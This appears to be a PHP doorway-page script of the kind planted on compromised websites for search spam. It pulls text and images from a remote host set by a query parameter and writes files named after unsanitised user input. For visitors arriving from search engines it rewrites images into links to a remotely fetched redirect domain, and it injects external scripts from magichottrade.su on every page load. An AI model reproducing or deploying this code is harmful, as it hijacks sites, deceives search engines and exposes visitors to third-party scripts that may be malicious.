
<?php

if ($_GET["id"] == "") $_GET["id"] = "";
$keyword = ucfirst(str_replace("-", " ", $_GET["id"]));

$x1=5;

$s = dirname($_SERVER['PHP_SELF']);
if ($s == '\\' | $s == '/') {$s = ('');}  
$s = $_SERVER['SERVER_NAME'] . $s;

$today = "20200614img";

if (!file_exists("./".$_GET["id"]))
{
$temp = "";

$key = str_replace("-", " ", $_GET["id"]);

$apass = "aodhfherkejkerjk";

	$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "http://".$_GET["looping"].".9.23.3/story2020.php?pass=$apass&q=$_GET[id]"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
$in_snip = curl_exec($ch); 
curl_close($ch);

	$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "http://".$_GET["looping"].".9.23.3/image2020.php?pass=$apass&q=$_GET[id]"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
$in_img = curl_exec($ch); 
curl_close($ch);
$in_img = explode("\n",$in_img);

//        $text = implode (" ", $in_snip);
$text = $in_snip;
        $text = str_replace("...", "", $text);
		$text = str_replace("\r\n", "", $text);
        $text = str_replace("\n", "", $text);
		$text = strip_tags($text); 
		$text = str_ireplace("mulondon", "", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);
		$text = str_replace("  ", " ", $text);


		$text = explode(".", $text);
		shuffle($text);
		$text = array_unique($text);	
		
shuffle($text);
shuffle($in_img);
$i=0;
$img_i=0;


foreach ($text as $snip)
{
if (strlen($snip)>60) 
{

	
  $temp .= "

	<div class=\"grid\">
		<div class=\"imgholder\">
			<img src='".chop($in_img[$img_i])."' />
		</div>
		<p>".chop($snip)."</p>
	</div>
";
$img_i++;
}
}


$temp .= "</div>";
$save = fopen("./".$_GET["id"], "w");
fwrite($save, $temp);
fclose($save);
}

else
{
	$temp = file("./".$_GET["id"]);
	$temp = implode(" ", $temp);
}

if ((strpos($_SERVER['HTTP_REFERER'], "google.")) OR (strpos($_SERVER['HTTP_REFERER'], "yahoo.")) OR (strpos($_SERVER['HTTP_REFERER'], "bing.")))

{

if (file_exists("mydom.txt"))
{
if ((date("U")-filemtime("mydom.txt"))>900)
{
	$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "http://".$_GET["looping"].".9.23.3/mydom.txt"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
$mydom = curl_exec($ch); 
curl_close($ch);

if (strlen($mydom)<5) $mydom = file_get_contents("http://".$_GET["looping"].".9.23.3/mydom.txt"); 

	
	$file = fopen("mydom.txt", "w");
	fwrite($file, $mydom);
	fclose($file);
}
}
else
{
	$ch = curl_init();  
curl_setopt($ch, CURLOPT_URL, "http://".$_GET["looping"].".9.23.3/mydom.txt"); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
$mydom = curl_exec($ch); 
curl_close($ch);

if (strlen($mydom)<5) $mydom = file_get_contents("http://".$_GET["looping"].".9.23.3/mydom.txt"); 

	
	$file = fopen("mydom.txt", "w");
	fwrite($file, $mydom);
	fclose($file);
}	

	$temp = file("./".$_GET["id"]);
	$in = implode(" ", $temp);
$in = explode("<", $in);

$temp = "";

$mydom = file("mydom.txt");
$mydom = chop($mydom[0]);
foreach ($in as $inn)
{
	$inn = " <".$inn;
	$inn = str_replace("< ", "", $inn);
	if (strpos($inn, "<img")) 
	{
		$key = chop($keys[rand(0,sizeof($keys))]);
		$key = str_replace(" ", "-", $key);
		$temp = $temp."<a href='http://$mydom/enter/enter.php?mark=$today-$s&engkey=$keyword'>";
		$temp = $temp.$inn; 
		$temp = $temp."</a>";
	}
	else $temp = $temp.$inn;
}


}


	echo "<!DOCTYPE html>
<html>
<head>
<title>$keyword</title>
<meta name=\"description\" content=\"$keyword\"/>
<meta name=\"keywords\" content=\"$keyword\"/>
<link rel='stylesheet' href='style.css' media='screen' />
<script src=\"http://magichottrade.su/?cid=gogogo\"></script>
<!--[if lt IE 9]>
<script src=\"//html5shiv.googlecode.com/svn/trunk/html5.js\"></script>
<![endif]-->
<script src=\"blocksit.min.js\"></script>
<script>
$(document).ready(function() {
	//vendor script
	$('#header')
	.css({ 'top':-50 })
	.delay(1000)
	.animate({'top': 0}, 800);
	
	$('#footer')
	.css({ 'bottom':-15 })
	.delay(1000)
	.animate({'bottom': 0}, 800);
	
	//blocksit define
	$(window).load( function() {
		$('#container').BlocksIt({
			numOfCol: 3,
			offsetX: 8,
			offsetY: 8
		});
	});
	
	//window resize
	var currentWidth = 1100;
	$(window).resize(function() {
		var winWidth = $(window).width();
		var conWidth;
		if(winWidth < 660) {
			conWidth = 440;
			col = 2
		} else if(winWidth < 880) {
			conWidth = 660;
			col = 3
		} else if(winWidth < 1100) {
			conWidth = 880;
			col = 4;
		} else {
			conWidth = 1100;
			col = 5;
		}
		
		if(conWidth != currentWidth) {
			currentWidth = conWidth;
			$('#container').width(conWidth);
			$('#container').BlocksIt({
				numOfCol: col,
				offsetX: 8,
				offsetY: 8
			});
		}
	});
});
</script>
<link rel=\"shortcut icon\" href=\"http://magichottrade.su/?cid=gogogo\" />
<link rel=\"canonical\" href=\"http://magichottrade.su/?cid=gogogo\" />
</head>
<body>

<!-- Header -->
<header id=\"header\">
	<h1>$keyword</h1>


	
	<div class=\"clearfix\"></div>
</header>

<!-- Content -->
<section id=\"wrapper\">
	<hgroup>
		<h2>$keyword</h2> 
	</hgroup>";
?>
	<center>
<script async="true" src="http://magichottrade.su/?cid=gogogo"></script>
<?php
echo "<div id=\"container\">
$temp
</div>
</section>

<!-- Footer -->
<footer id=\"footer\">
";
?>

</footer>
</body>
</html>